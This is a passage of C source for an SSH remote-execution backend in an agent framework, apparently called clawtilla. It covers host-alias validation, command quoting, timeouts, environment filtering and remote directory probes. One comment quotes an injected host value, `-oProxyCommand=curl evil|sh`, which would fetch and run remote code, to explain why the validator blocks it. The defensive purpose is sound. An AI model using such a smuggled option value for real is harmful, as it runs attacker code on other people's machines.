/*
 * clawt-ssh-computer.c - A machine somebody else already runs
 *
 * Copyright (C) 2026
 * SPDX-License-Identifier: AGPL-3.0-or-later
 *
 * This file is part of clawtilla.
 */

#include "clawtilla.h"
#include "computer/clawt-ssh-computer.h"

#include <signal.h>
#include <string.h>

/*
 * How much output one command may return.
 *
 * The same limit the host backend uses, for the same reason: an agent
 * that runs `find /` produces a reply too large to send and too large to
 * reason about.
 */

/*
 * How long a SIGTERM is given before SIGKILL follows.
 *
 * Five seconds rather than one.  A timed-out ssh has to tear down a
 * connection that may be on the far side of a slow link, and killing it
 * outright the moment it is asked to stop leaves the master socket and
 * the remote channel in a state the *next* command inherits.  One second
 * is a LAN number; this is not always a LAN.
 */
#define TERM_GRACE_SECONDS (5)

/*
 * How long a probe may take.
 *
 * Probes run inside clawt_computer_start(), which has somebody waiting
 * on it.  ConnectTimeout bounds a host that never answers; this bounds
 * one that answers and then stops talking.
 */
#define PROBE_TIMEOUT_SECONDS (20)

struct _ClawtSshComputer {
    ClawtComputer parent_instance;

    gchar        *host;
    gchar        *workspace;
    gchar        *shell;
    ClawtSandbox *sandbox;

    guint         connect_timeout;
    guint         control_persist;

    /* NULL when multiplexing is off; see clawt_ssh_computer_new(). */
    gchar        *control_path;

    ClawtSshStatus status;
};

G_DEFINE_FINAL_TYPE(ClawtSshComputer, clawt_ssh_computer, CLAWT_TYPE_COMPUTER)

/* ── Pure helpers, assertable with no ssh and no host ────────────── */

gboolean
clawt_ssh_host_is_valid(const gchar *host, GError **error)
{
    gsize i;

    if (host == NULL || *host == '\0') {
        g_set_error_literal(error, CLAWT_ERROR, CLAWT_ERROR_CONFIG_INVALID,
                            "computer.ssh.host is not set. It takes an alias "
                            "out of ~/.ssh/config -- the name you would type "
                            "after `ssh` -- so the identity file, the port, "
                            "the user and any ProxyJump stay where ssh "
                            "already keeps them.");
        return FALSE;
    }

    /*
     * The leading hyphen is the one that matters.  ssh reads any
     * argument starting with "-" as an option, so an alias spelled
     * `-oProxyCommand=curl evil|sh` would not be a destination at all --
     * it would be a command clawtilla ran on somebody's behalf, and no
     * amount of quoting further down would help, because the string
     * never reaches a shell to be quoted for.
     */
    if (host[0] == '-') {
        g_set_error(error, CLAWT_ERROR, CLAWT_ERROR_CONFIG_INVALID,
                    "computer.ssh.host '%s' begins with '-', which ssh reads "
                    "as an option rather than as a machine to connect to. "
                    "Give the host an alias in ~/.ssh/config and name that.",
                    host);
        return FALSE;
    }

    for (i = 0; host[i] != '\0'; i++) {
        if (g_ascii_isalnum(host[i]) || host[i] == '.' || host[i] == '_' ||
            host[i] == '-')
            continue;

        g_set_error(error, CLAWT_ERROR, CLAWT_ERROR_CONFIG_INVALID,
                    "computer.ssh.host '%s' contains '%c'. It must be an "
                    "alias from ~/.ssh/config, made of letters, digits, "
                    "'.', '_' and '-' -- not a user@host, not a URL and not "
                    "an ssh option. Everything else about the connection "
                    "belongs in ~/.ssh/config.",
                    host, host[i]);
        return FALSE;
    }

    return TRUE;
}

gchar *
clawt_ssh_control_path(const gchar *agent_id, const gchar *host,
                       GError **error)
{
    g_autofree gchar *dir = NULL;
    g_autofree gchar *path = NULL;

    g_return_val_if_fail(agent_id != NULL, NULL);
    g_return_val_if_fail(host != NULL, NULL);

    /*
     * Under the runtime directory rather than the state directory: it is
     * a socket, it belongs to this boot, and the runtime directory is
     * both short and already the right lifetime.
     *
     * Per (agent, alias).  Two agents pointed at one machine sharing a
     * master would mean stopping either one closes the connection the
     * other is running a command over.
     */
    dir = g_build_filename(g_get_user_runtime_dir(), "clawtilla", "ssh", NULL);
    path = g_strdup_printf("%s/%s@%s", dir, agent_id, host);

    /*
     * Checked before anything tries to use it.  An over-long path does
     * not fail at bind time: ssh simply never creates the master, every
     * command pays a full handshake, and the only symptom is the remote
     * feeling slow. clawt_check_socket_path() says the number instead.
     */
    if (!clawt_check_socket_path(path, error))
        return NULL;

    return g_steal_pointer(&path);
}

ClawtSshProbe
clawt_ssh_classify_probe(gint exit_status, const gchar *stderr_text)
{
    static const gchar *const absent[] = {
        "no such object", "no such image", "no such container",
        "no such file", NULL
    };
    g_autofree gchar *lowered = NULL;
    gsize i;

    if (exit_status == 0)
        return CLAWT_SSH_PROBE_PRESENT;

    /*
     * 255 is ssh's own.  The protocol reserves it for "the client
     * failed", so a remote command that exits 255 is indistinguishable
     * from a connection that never got there -- and the safe reading of
     * an ambiguity is the one that does not claim absence.
     */
    if (exit_status == 255)
        return CLAWT_SSH_PROBE_TRANSPORT;

    if (stderr_text == NULL)
        return CLAWT_SSH_PROBE_TRANSPORT;

    lowered = g_ascii_strdown(stderr_text, -1);

    for (i = 0; absent[i] != NULL; i++) {
        if (strstr(lowered, absent[i]) != NULL)
            return CLAWT_SSH_PROBE_MISSING;
    }

    /*
     * Everything else -- a permission error, a hung mount, a shell that
     * could not start, an sshd that closed the channel -- is a question
     * that never got a real answer.  Reading any of them as "not there"
     * is how a provisioner sets about creating what already exists on a
     * machine clawtilla does not own.
     */
    return CLAWT_SSH_PROBE_TRANSPORT;
}

ClawtSshStatus
clawt_ssh_status_resolve(gboolean configured,
                         gboolean reachable,
                         gboolean host_key_ok,
                         gboolean authenticated,
                         gboolean workspace_present,
                         gboolean ready)
{
    /*
     * Strictly in order, and the first failure wins.  Every rung below
     * an unreachable host is also failing, and saying so would send
     * somebody to check four things when only the first has a cause.
     */
    if (!configured)
        return CLAWT_SSH_STATUS_NOT_CONFIGURED;

    if (!reachable)
        return CLAWT_SSH_STATUS_UNREACHABLE;

    if (!host_key_ok)
        return CLAWT_SSH_STATUS_HOST_KEY;

    if (!authenticated)
        return CLAWT_SSH_STATUS_AUTH_FAILED;

    if (!workspace_present)
        return CLAWT_SSH_STATUS_WORKSPACE_MISSING;

    if (!ready)
        return CLAWT_SSH_STATUS_NOT_READY;

    return CLAWT_SSH_STATUS_READY;
}

gchar *
clawt_ssh_status_message(ClawtSshStatus status, const gchar *host,
                         const gchar *workspace)
{
    const gchar *alias = (host != NULL && *host != '\0') ? host : "(unset)";

    switch (status) {
    case CLAWT_SSH_STATUS_READY:
        return g_strdup_printf("%s answers and the workspace is there.",
                               alias);

    case CLAWT_SSH_STATUS_NOT_CONFIGURED:
        return g_strdup("no machine is configured: set computer.ssh.host to "
                        "an alias from ~/.ssh/config.");

    case CLAWT_SSH_STATUS_UNREACHABLE:
        return g_strdup_printf("nothing answered at '%s'. Check the machine "
                               "is up and that `ssh %s true` works from this "
                               "account.", alias, alias);

    case CLAWT_SSH_STATUS_HOST_KEY:
        /*
         * The remedy is a person at a terminal, and it is spelled out
         * because the alternative -- StrictHostKeyChecking=no -- is a
         * decision clawtilla is not entitled to make on somebody's
         * behalf, and would turn a warning about a changed key into
         * silence.
         */
        return g_strdup_printf("the host key for '%s' is unknown or has "
                               "changed, so the connection was refused. Run "
                               "`ssh %s true` once by hand and accept the "
                               "key yourself -- clawtilla will not turn host "
                               "key checking off for you.", alias, alias);

    case CLAWT_SSH_STATUS_AUTH_FAILED:
        return g_strdup_printf("'%s' answered but refused the login. Check "
                               "the IdentityFile and User on that alias in "
                               "~/.ssh/config; the connection is made with "
                               "BatchMode=yes, so nothing can prompt for a "
                               "passphrase.", alias);

    case CLAWT_SSH_STATUS_WORKSPACE_MISSING:
        return g_strdup_printf("'%s' is reachable, but %s is not a directory "
                               "over there. Create it, or point "
                               "computer.ssh.workspace somewhere that "
                               "exists.", alias,
                               (workspace != NULL && *workspace != '\0')
                               ? workspace : "the workspace");

    case CLAWT_SSH_STATUS_NOT_READY:
        return g_strdup_printf("'%s' has not been checked yet; it is checked "
                               "when the agent starts.", alias);
    }

    return g_strdup("the state of this computer is unknown.");
}

gchar *
clawt_ssh_resolve_binary(const gchar *name, GError **error)
{
    g_autofree gchar *exe = NULL;
    g_autofree gchar *beside = NULL;
    g_autofree gchar *installed = NULL;
    g_autofree gchar *found = NULL;

    g_return_val_if_fail(name != NULL, NULL);

    /*
     * Beside the running binary, then the install location, then PATH --
     * the order clawt-pod-bridge.c resolves a module in, and for the
     * same reason: a checkout that has staged its own copy should use
     * it, and a refusal should name every place that was tried rather
     * than saying "not found" about a name.
     */
    exe = g_file_read_link("/proc/self/exe", NULL);

    if (exe != NULL) {
        g_autofree gchar *dir = g_path_get_dirname(exe);

        beside = g_build_filename(dir, name, NULL);

        if (g_file_test(beside, G_FILE_TEST_IS_EXECUTABLE))
            return g_steal_pointer(&beside);
    }

    installed = g_build_filename("/usr/bin", name, NULL);

    if (g_file_test(installed, G_FILE_TEST_IS_EXECUTABLE))
        return g_steal_pointer(&installed);

    found = g_find_program_in_path(name);

    if (found != NULL)
        return g_steal_pointer(&found);

    g_set_error(error, CLAWT_ERROR, CLAWT_ERROR_NOT_SUPPORTED,
                "computer.type: ssh needs %s, which is not here. Looked "
                "beside this binary (%s), in the install location (%s) and "
                "on PATH. Install it (Fedora: openssh-clients).",
                name,
                beside != NULL ? beside : "could not be determined",
                installed);

    return NULL;
}

gboolean
clawt_ssh_sftp_path_is_safe(const gchar *path)
{
    if (path == NULL || *path == '\0')
        return FALSE;

    /*
     * sftp's batch language has double quotes and no escape inside them,
     * so these three cannot be written at all.  The newline is the one
     * that is a hazard rather than an inconvenience: it would end the
     * line and begin a second sftp command chosen by whoever supplied
     * the path.
     */
    return strpbrk(path, "\"\\\n\r") == NULL;
}

gchar *
clawt_ssh_build_sftp_batch(const gchar *command, const gchar *first,
                           const gchar *second)
{
    g_return_val_if_fail(command != NULL, NULL);

    if (!clawt_ssh_sftp_path_is_safe(first) ||
        !clawt_ssh_sftp_path_is_safe(second))
        return NULL;

    return g_strdup_printf("%s \"%s\" \"%s\"\n", command, first, second);
}

/* ── Building the command line ───────────────────────────────────── */

/*
 * The options every invocation carries, ssh and sftp alike.
 *
 * BatchMode is not a convenience: nobody is watching a daemon, so a
 * prompt there can only wedge it.  Without it OpenSSH answers an unknown
 * host key by running SSH_ASKPASS -- a graphical dialog on this desktop
 * -- and waits for a person for ever, holding the worker thread and the
 * turn with it.
 *
 * What is deliberately absent is StrictHostKeyChecking.  Leaving it at
 * whatever the operator configured is the safe half: the default refuses
 * an unknown host, and turning that off is a decision that belongs to
 * the person whose machine it is.
 */
static void
append_common_options(ClawtSshComputer *self, GPtrArray *argv)
{
    g_ptr_array_add(argv, g_strdup("-o"));
    g_ptr_array_add(argv, g_strdup("BatchMode=yes"));

    g_ptr_array_add(argv, g_strdup("-o"));
    g_ptr_array_add(argv, g_strdup_printf("ConnectTimeout=%u",
                                          self->connect_timeout));

    /*
     * Keepalives, so a link that goes away is noticed rather than
     * waited on.  Without them a command survives its own host
     * disappearing: the TCP connection is still open as far as this end
     * is concerned and ssh sits there until the kernel gives up, which
     * turns a turn that should have failed into one that hangs.
     */
    g_ptr_array_add(argv, g_strdup("-o"));
    g_ptr_array_add(argv, g_strdup("ServerAliveInterval=15"));
    g_ptr_array_add(argv, g_strdup("-o"));
    g_ptr_array_add(argv, g_strdup("ServerAliveCountMax=3"));

    if (self->control_path != NULL && self->control_persist > 0) {
        g_ptr_array_add(argv, g_strdup("-o"));
        g_ptr_array_add(argv, g_strdup("ControlMaster=auto"));
        g_ptr_array_add(argv, g_strdup("-o"));
        g_ptr_array_add(argv, g_strdup_printf("ControlPath=%s",
                                              self->control_path));
        g_ptr_array_add(argv, g_strdup("-o"));
        g_ptr_array_add(argv, g_strdup_printf("ControlPersist=%u",
                                              self->control_persist));
    }
}

/*
 * ssh, the options, and the destination -- everything before the remote
 * command.
 *
 * The "--" goes here, before the destination, and not after it.  ssh
 * concatenates everything following the destination into the remote
 * command line, so `ssh host -- ls` asks the far end to run "-- ls",
 * which is not a program.
 */
static GPtrArray *
begin_ssh_argv(ClawtSshComputer *self, const gchar *binary)
{
    GPtrArray *argv = g_ptr_array_new_with_free_func(g_free);

    g_ptr_array_add(argv, g_strdup(binary));
    append_common_options(self, argv);

    /* No pty. One would echo the command back and merge stderr into stdout. */
    g_ptr_array_add(argv, g_strdup("-T"));

    g_ptr_array_add(argv, g_strdup("--"));
    g_ptr_array_add(argv, g_strdup(self->host));

    return argv;
}

/*
 * Wraps a shell line as the three words ssh should hand the far end.
 *
 * ssh joins everything after the destination with spaces and gives the
 * result to the *login* shell, whatever that is.  Naming the shell here
 * and quoting the line for it is what makes an agent behave the same on
 * a host whose login shell is fish as on one where it is bash.
 */
static void
append_remote_line(ClawtSshComputer *self, GPtrArray *argv,
                   const gchar *line)
{
    g_ptr_array_add(argv, g_strdup(self->shell != NULL ? self->shell
                                                       : "/bin/sh"));
    g_ptr_array_add(argv, g_strdup("-c"));
    g_ptr_array_add(argv, g_shell_quote(line));
}

static GStrv
build_argv_for_line(ClawtSshComputer *self, const gchar *binary,
                    const gchar *line)
{
    GPtrArray *argv = begin_ssh_argv(self, binary);

    append_remote_line(self, argv, line);
    g_ptr_array_add(argv, NULL);

    return (GStrv)g_ptr_array_free(argv, FALSE);
}

/*
 * The command as one shell line, with every argument quoted.
 *
 * Exactly what the container, distrobox and VM backends do, so an agent
 * does not have to know which kind of computer it has to predict what
 * its own arguments mean: ">", "|", "&&", ";", "*" and "$VAR" all arrive
 * as literal text.
 */
static gchar *
join_quoted(const gchar * const *argv, const gchar *working_dir)
{
    g_autoptr(GString) joined = g_string_new(NULL);
    gsize i;

    if (working_dir != NULL && *working_dir != '\0') {
        g_autofree gchar *quoted_dir = g_shell_quote(working_dir);

        g_string_append_printf(joined, "cd %s && ", quoted_dir);
    }

    for (i = 0; argv != NULL && argv[i] != NULL; i++) {
        g_autofree gchar *quoted = g_shell_quote(argv[i]);

        if (i > 0)
            g_string_append_c(joined, ' ');

        g_string_append(joined, quoted);
    }

    return g_string_free(g_steal_pointer(&joined), FALSE);
}

GStrv
clawt_ssh_computer_build_argv(ClawtSshComputer    *self,
                              const gchar * const *argv,
                              const gchar         *working_dir)
{
    g_autofree gchar *line = NULL;
    const gchar *directory;

    g_return_val_if_fail(CLAWT_IS_SSH_COMPUTER(self), NULL);

    if (self->host == NULL)
        return NULL;

    /*
     * With nothing asked for, the agent's own remote workspace -- so a
     * relative path in a command means what the agent was told it means
     * rather than whatever the login shell's home happens to be.
     */
    directory = (working_dir != NULL && *working_dir != '\0')
                ? working_dir : self->workspace;

    line = join_quoted(argv, directory);

    return build_argv_for_line(self, "ssh", line);
}

/* ── Running one command ─────────────────────────────────────────── */

typedef struct {
    GSubprocess  *process;
    GMainLoop    *loop;
    GMainContext *context;
    gboolean      timed_out;
    GSource      *kill_source;
    gchar        *stdout_text;
    gchar        *stderr_text;
    GError       *error;
} ExecWait;

/*
 * The second stage.  SIGTERM asked; this insists.
 */
static gboolean
on_kill_deadline(gpointer user_data)
{
    ExecWait *wait = user_data;

    g_subprocess_force_exit(wait->process);

    return G_SOURCE_REMOVE;
}

/*
 * The first stage.
 *
 * SIGTERM rather than SIGKILL, because a killed ssh never gets to close
 * its channel and the multiplexing master is left holding one -- which
 * the *next* command inherits.  The grace period is attached to the same
 * context this loop is running, not added with g_timeout_add_seconds():
 * that helper attaches to the default context, which nothing here runs,
 * so the second stage would never fire and a wedged ssh would be waited
 * on for ever.
 */
static gboolean
on_exec_timeout(gpointer user_data)
{
    ExecWait *wait = user_data;

    wait->timed_out = TRUE;
    g_subprocess_send_signal(wait->process, SIGTERM);

    wait->kill_source = g_timeout_source_new_seconds(TERM_GRACE_SECONDS);
    g_source_set_callback(wait->kill_source, on_kill_deadline, wait, NULL);
    g_source_attach(wait->kill_source, wait->context);

    return G_SOURCE_REMOVE;
}

static void
on_exec_done(GObject *source, GAsyncResult *result, gpointer user_data)
{
    ExecWait *wait = user_data;

    g_subprocess_communicate_utf8_finish(G_SUBPROCESS(source), result,
                                         &wait->stdout_text,
                                         &wait->stderr_text,
                                         &wait->error);
    g_main_loop_quit(wait->loop);
}

/*
 * Spawns a prepared command line and waits for it, on a context of its
 * own.
 *
 * Shared by exec and by every probe, so the timeout, the two-stage kill
 * and the output bound cannot differ between "what the agent ran" and
 * "what clawtilla asked to find out" -- two of these would disagree
 * exactly once, on the case nobody drives.
 */
static gboolean
run_prepared(const gchar * const *command,
             const gchar         *stdin_text,
             guint                timeout_seconds,
             GCancellable        *cancellable,
             gint                *exit_status_out,
             gchar              **stdout_out,
             gchar              **stderr_out,
             GError             **error)
{
    g_autoptr(GSubprocessLauncher) launcher = NULL;
    g_autoptr(GMainContext) context = NULL;
    g_autoptr(GMainLoop) loop = NULL;
    ExecWait wait;
    GSource *timeout_source = NULL;
    GSubprocessFlags flags = G_SUBPROCESS_FLAGS_STDOUT_PIPE |
                             G_SUBPROCESS_FLAGS_STDERR_PIPE;

    if (stdin_text != NULL)
        flags |= G_SUBPROCESS_FLAGS_STDIN_PIPE;

    launcher = g_subprocess_launcher_new(flags);

    /*
     * The allowlisted environment, not the daemon's.  ssh reads
     * SSH_AUTH_SOCK and SSH_ASKPASS out of its environment, and handing
     * a command an agent chose the operator's agent socket would give it
     * every key that agent holds -- the rule the host backend already
     * had to learn.
     */
    {
        g_auto(GStrv) environment = clawt_build_child_environment(NULL);

        g_subprocess_launcher_set_environ(launcher, environment);
    }

    memset(&wait, 0, sizeof(wait));

    wait.process = g_subprocess_launcher_spawnv(launcher, command, error);

    if (wait.process == NULL)
        return FALSE;

    context = g_main_context_new();
    g_main_context_push_thread_default(context);
    loop = g_main_loop_new(context, FALSE);
    wait.loop = loop;
    wait.context = context;

    if (timeout_seconds > 0) {
        timeout_source = g_timeout_source_new_seconds(timeout_seconds);
        g_source_set_callback(timeout_source, on_exec_timeout, &wait, NULL);
        g_source_attach(timeout_source, context);
    }

    g_subprocess_communicate_utf8_async(wait.process, stdin_text, cancellable,
                                        on_exec_done, &wait);
    g_main_loop_run(loop);

    if (timeout_source != NULL) {
        g_source_destroy(timeout_source);
        g_source_unref(timeout_source);
    }

    if (wait.kill_source != NULL) {
        g_source_destroy(wait.kill_source);
        g_source_unref(wait.kill_source);
    }

    g_main_context_pop_thread_default(context);

    if (wait.error != NULL) {
        g_propagate_error(error, wait.error);
        g_clear_object(&wait.process);
        g_free(wait.stdout_text);
        g_free(wait.stderr_text);
        return FALSE;
    }

    if (wait.timed_out) {
        g_set_error(error, CLAWT_ERROR, CLAWT_ERROR_TIMEOUT,
                    "the command did not finish within %u seconds and was "
                    "stopped. Note that clawtilla can only stop its end: "
                    "without a terminal the far side is not signalled, so "
                    "anything still running over there is still running.",
                    timeout_seconds);
        g_clear_object(&wait.process);
        g_free(wait.stdout_text);
        g_free(wait.stderr_text);
        return FALSE;
    }

    if (exit_status_out != NULL)
        *exit_status_out = g_subprocess_get_exit_status(wait.process);

    if (stdout_out != NULL)
        *stdout_out = g_steal_pointer(&wait.stdout_text);

    if (stderr_out != NULL)
        *stderr_out = g_steal_pointer(&wait.stderr_text);

    g_clear_object(&wait.process);
    g_free(wait.stdout_text);
    g_free(wait.stderr_text);

    return TRUE;
}

/*
 * Runs a shell line over there and reports what came back, without
 * deciding what any of it means.
 */
static gboolean
run_remote_line(ClawtSshComputer *self, const gchar *line,
                guint timeout_seconds, gint *exit_status_out,
                gchar **stdout_out, gchar **stderr_out, GError **error)
{
    g_autofree gchar *binary = clawt_ssh_resolve_binary("ssh", error);
    g_auto(GStrv) command = NULL;

    if (binary == NULL)
        return FALSE;

    command = build_argv_for_line(self, binary, line);

    return run_prepared((const gchar * const *)command, NULL,
                        timeout_seconds, NULL, exit_status_out,
                        stdout_out, stderr_out, error);
}

/*
 * Asks whether a directory is there, in a form clawt_ssh_classify_probe()
 * can read.
 *
 * `test -d` on its own answers 1 for "no" and 1 for several other
 * things, and an exit status alone cannot tell those apart. Saying "no
 * such file or directory" out loud is what makes absence a claim the
 * remote made rather than one this end inferred from a number.
 */
static ClawtSshProbe
probe_directory(ClawtSshComputer *self, const gchar *path, GError **error)
{
    g_autofree gchar *quoted = g_shell_quote(path);
    g_autofree gchar *line = NULL;
    g_autofree gchar *errors = NULL;
    gint exit_status = 0;

    line = g_strdup_printf(
        "test -d %s || { echo \"no such file or directory: %s\" >&2; "
        "exit 1; }", quoted, quoted);

    if (!run_remote_line(self, line, PROBE_TIMEOUT_SECONDS, &exit_status,
                         NULL, &errors, error))
        return CLAWT_SSH_PROBE_TRANSPORT;

    return clawt_ssh_classify_probe(exit_status, errors);
}

/* ── Construction ────────────────────────────────────────────────── */

ClawtComputer *
clawt_ssh_computer_new(const gchar *agent_id, const gchar *host)
{
    ClawtSshComputer *self;

    g_return_val_if_fail(agent_id != NULL, NULL);

    self = g_object_new(CLAWT_TYPE_SSH_COMPUTER, NULL);
    clawt_computer_bind_agent(CLAWT_COMPUTER(self), agent_id);

    self->host = g_strdup(host);

    if (host != NULL && *host != '\0') {
        g_autoptr(GError) local = NULL;

        self->control_path = clawt_ssh_control_path(agent_id, host, &local);

        /*
         * A path that will not fit turns multiplexing off *and says so*.
         * Left on, ssh would never create the master and every command
         * would pay a fresh handshake, which reads as the remote being
         * slow rather than as a path being too long -- and nothing
         * anywhere would mention a path.
         *
         * Said here rather than stored for later: this is an operator's
         * problem, not the agent's, and the journal is where an operator
         * is looking. A field holding the reason would be one more thing
         * read by nothing.
         */
        if (self->control_path == NULL && local != NULL)
            g_warning("ssh computer %s: connection multiplexing is off "
                      "because its control socket path does not fit -- "
                      "every command will pay a full handshake. %s",
                      agent_id, local->message);
    }

    return CLAWT_COMPUTER(self);
}

void
clawt_ssh_computer_set_workspace(ClawtSshComputer *self,
                                 const gchar      *workspace)
{
    g_return_if_fail(CLAWT_IS_SSH_COMPUTER(self));

    g_free(self->workspace);

    /*
     * Not clawt_expand_path(): "~" and $XDG_* would be expanded against
     * *this* machine's home and runtime directory, producing a path that
     * exists here and means nothing over there.
     */
    self->workspace = (workspace != NULL && *workspace != '\0')
                      ? g_strdup(workspace) : NULL;
}

void
clawt_ssh_computer_set_shell(ClawtSshComputer *self, const gchar *shell)
{
    g_return_if_fail(CLAWT_IS_SSH_COMPUTER(self));

    g_free(self->shell);
    self->shell = (shell != NULL && *shell != '\0') ? g_strdup(shell) : NULL;
}

void
clawt_ssh_computer_set_sandbox(ClawtSshComputer *self, ClawtSandbox *sandbox)
{
    g_return_if_fail(CLAWT_IS_SSH_COMPUTER(self));
    g_return_if_fail(sandbox == NULL || CLAWT_IS_SANDBOX(sandbox));

    /*
     * A local sandbox is refused rather than accepted.  The two are
     * indistinguishable from the outside and differ exactly on the case
     * that matters: a local one resolves "/srv/work/../../etc" with
     * realpath() against a machine where none of it exists, hands back
     * the string unchanged, and the containment test then reads it as
     * inside "/srv/work".
     */
    if (sandbox != NULL && !clawt_sandbox_is_remote(sandbox)) {
        g_warning("ssh computer %s was handed a local sandbox; its paths "
                  "name another machine, so it needs one built with "
                  "clawt_sandbox_new_remote(). Refusing it, which leaves "
                  "the computer unusable rather than unconfined.",
                  clawt_computer_get_agent_id(CLAWT_COMPUTER(self)));
        return;
    }

    g_clear_object(&self->sandbox);

    if (sandbox != NULL)
        self->sandbox = g_object_ref(sandbox);
}

void
clawt_ssh_computer_apply_mounts(ClawtSshComputer *self)
{
    GPtrArray *mounts;
    guint i;

    g_return_if_fail(CLAWT_IS_SSH_COMPUTER(self));

    if (self->sandbox == NULL)
        return;

    mounts = clawt_computer_get_mounts(CLAWT_COMPUTER(self));

    for (i = 0; mounts != NULL && i < mounts->len; i++) {
        ClawtMount *mount = g_ptr_array_index(mounts, i);
        const gchar *target = clawt_mount_get_target(mount);

        if (target != NULL && *target != '\0')
            clawt_sandbox_add_mount_path(self->sandbox, target);
    }
}

ClawtSandbox *
clawt_ssh_computer_get_sandbox(ClawtSshComputer *self)
{
    g_return_val_if_fail(CLAWT_IS_SSH_COMPUTER(self), NULL);

    return self->sandbox;
}

void
clawt_ssh_computer_set_connect_timeout(ClawtSshComputer *self, guint seconds)
{
    g_return_if_fail(CLAWT_IS_SSH_COMPUTER(self));

    /*
     * Zero would mean "wait for the kernel", which is the failure this
     * setting exists to prevent.  Floored rather than refused: a config
     * that says 0 plainly means "do not make me wait", and the smallest
     * honest answer to that is one second.
     */
    self->connect_timeout = seconds > 0 ? seconds : 1;
}

void
clawt_ssh_computer_set_control_persist(ClawtSshComputer *self, guint seconds)
{
    g_return_if_fail(CLAWT_IS_SSH_COMPUTER(self));

    self->control_persist = seconds;
}

ClawtSshStatus
clawt_ssh_computer_get_status(ClawtSshComputer *self)
{
    g_return_val_if_fail(CLAWT_IS_SSH_COMPUTER(self),
                         CLAWT_SSH_STATUS_NOT_CONFIGURED);

    return self->status;
}

/* ── Lifecycle ───────────────────────────────────────────────────── */

/*
 * Reads what came back from the very first connection and decides which
 * rung of the ladder it puts us on.
 *
 * OpenSSH says these things in prose and there is no status code that
 * distinguishes them -- every one of them is exit 255 -- so the text is
 * what there is to read.  Matched on the phrases OpenSSH has used for
 * twenty years, and anything unrecognised is left as "unreachable",
 * which is the rung that asks somebody to try `ssh <alias> true` and
 * find out.
 */
static ClawtSshStatus
classify_connection(gint exit_status, const gchar *stderr_text)
{
    g_autofree gchar *lowered = NULL;

    if (exit_status == 0)
        return CLAWT_SSH_STATUS_READY;

    if (stderr_text == NULL)
        return CLAWT_SSH_STATUS_UNREACHABLE;

    lowered = g_ascii_strdown(stderr_text, -1);

    if (strstr(lowered, "host key verification failed") != NULL ||
        strstr(lowered, "remote host identification has changed") != NULL ||
        strstr(lowered, "no matching host key") != NULL)
        return CLAWT_SSH_STATUS_HOST_KEY;

    if (strstr(lowered, "permission denied") != NULL ||
        strstr(lowered, "too many authentication failures") != NULL ||
        strstr(lowered, "no supported authentication methods") != NULL)
        return CLAWT_SSH_STATUS_AUTH_FAILED;

    return CLAWT_SSH_STATUS_UNREACHABLE;
}

/*
 * There is nothing to create, so provisioning is entirely a check that
 * what the configuration claims is actually there.
 *
 * Done here rather than at the first command so that a machine that
 * cannot be reached surfaces when the agent starts, with one sentence
 * saying why -- the same reason the host backend checks its confinement
 * at provision time.
 */
static gboolean
ssh_provision(ClawtComputer *computer, GError **error)
{
    ClawtSshComputer *self = CLAWT_SSH_COMPUTER(computer);
    g_autofree gchar *binary = NULL;
    g_autofree gchar *errors = NULL;
    g_autofree gchar *message = NULL;
    GPtrArray *mounts;
    gint exit_status = 0;
    guint i;

    if (!clawt_ssh_host_is_valid(self->host, error)) {
        self->status = CLAWT_SSH_STATUS_NOT_CONFIGURED;
        clawt_computer_set_state(computer, CLAWT_COMPUTER_STATE_ERROR,
                                 (error != NULL && *error != NULL)
                                 ? (*error)->message : NULL);
        return FALSE;
    }

    binary = clawt_ssh_resolve_binary("ssh", error);

    if (binary == NULL) {
        clawt_computer_set_state(computer, CLAWT_COMPUTER_STATE_ERROR,
                                 (error != NULL && *error != NULL)
                                 ? (*error)->message : NULL);
        return FALSE;
    }

    clawt_computer_set_state(computer, CLAWT_COMPUTER_STATE_PROVISIONING,
                             NULL);

    clawt_ssh_computer_apply_mounts(self);

    /*
     * One round trip that answers "is it up, is the key known, does the
     * login work" together, because ssh cannot be asked them separately
     * -- it reports all three the same way and only the message differs.
     */
    if (!run_remote_line(self, "true", PROBE_TIMEOUT_SECONDS, &exit_status,
                         NULL, &errors, error)) {
        self->status = CLAWT_SSH_STATUS_UNREACHABLE;
        message = clawt_ssh_status_message(self->status, self->host,
                                           self->workspace);
        clawt_computer_set_state(computer, CLAWT_COMPUTER_STATE_ERROR,
                                 message);
        return FALSE;
    }

    self->status = classify_connection(exit_status, errors);

    if (self->status != CLAWT_SSH_STATUS_READY) {
        message = clawt_ssh_status_message(self->status, self->host,
                                           self->workspace);
        g_set_error_literal(error, CLAWT_ERROR, CLAWT_ERROR_NOT_SUPPORTED,
                            message);
        clawt_computer_set_state(computer, CLAWT_COMPUTER_STATE_ERROR,
                                 message);
        return FALSE;
    }

    if (self->workspace != NULL) {
        ClawtSshProbe found = probe_directory(self, self->workspace, NULL);

        /*
         * Only a positive "no such file" makes the workspace missing. A
         * probe that did not get a real answer leaves the connection
         * rung as the thing to report, because inventing a workspace
         * problem out of a dropped link sends somebody to look in the
         * wrong place -- and would have this backend create directories
         * on a machine it does not own.
         */
        if (found == CLAWT_SSH_PROBE_MISSING) {
            self->status = CLAWT_SSH_STATUS_WORKSPACE_MISSING;
            message = clawt_ssh_status_message(self->status, self->host,
                                               self->workspace);
            g_set_error_literal(error, CLAWT_ERROR, CLAWT_ERROR_NOT_FOUND,
                                message);
            clawt_computer_set_state(computer, CLAWT_COMPUTER_STATE_ERROR,
                                     message);
            return FALSE;
        }

        if (found == CLAWT_SSH_PROBE_TRANSPORT) {
            self->status = CLAWT_SSH_STATUS_UNREACHABLE;
            message = clawt_ssh_status_message(self->status, self->host,
                                               self->workspace);
            g_set_error_literal(error, CLAWT_ERROR, CLAWT_ERROR_NOT_SUPPORTED,
                                message);
            clawt_computer_set_state(computer, CLAWT_COMPUTER_STATE_ERROR,
                                     message);
            return FALSE;
        }
    }

    /*
     * A mount is not a mount here -- it is a grant.  Each one is checked
     * over there, and a `required` one that is genuinely absent fails
     * the provision, which is what makes the agent a SHADOW with a
     * reason instead of one that starts and is refused every path it was
     * promised.
     */
    mounts = clawt_computer_get_mounts(computer);

    for (i = 0; mounts != NULL && i < mounts->len; i++) {
        ClawtMount *mount = g_ptr_array_index(mounts, i);
        const gchar *target = clawt_mount_get_target(mount);
        ClawtSshProbe found;

        if (target == NULL || *target == '\0')
            continue;

        found = probe_directory(self, target, NULL);

        if (found == CLAWT_SSH_PROBE_PRESENT)
            continue;

        if (clawt_mount_get_required(mount)) {
            g_set_error(error, CLAWT_ERROR, CLAWT_ERROR_NOT_FOUND,
                        "'%s' is marked required and %s on %s. %s",
                        target,
                        found == CLAWT_SSH_PROBE_MISSING
                        ? "is not a directory"
                        : "could not be checked",
